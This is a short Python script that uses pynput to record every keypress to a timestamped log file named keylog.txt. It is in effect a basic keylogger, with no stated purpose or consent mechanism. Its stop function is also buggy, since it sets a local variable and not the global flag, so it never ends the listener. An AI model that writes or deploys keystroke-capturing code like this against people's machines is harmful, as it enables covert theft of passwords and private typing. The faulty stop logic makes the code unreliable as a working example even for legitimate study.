from pynput.keyboard import Key, Listener
import logging
import time
global listener_exit
global end_thread
end_thread = False
listener_exit = False

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def proxy_start():
    start_listener()

def stop_listener():
    listener_exit = True

def on_press(key):
    if listener_exit:
        return 1
    logging.info(str(key))


def start_listener():
    listener = Listener(on_press=on_press)
    listener.start()
    listener.join()
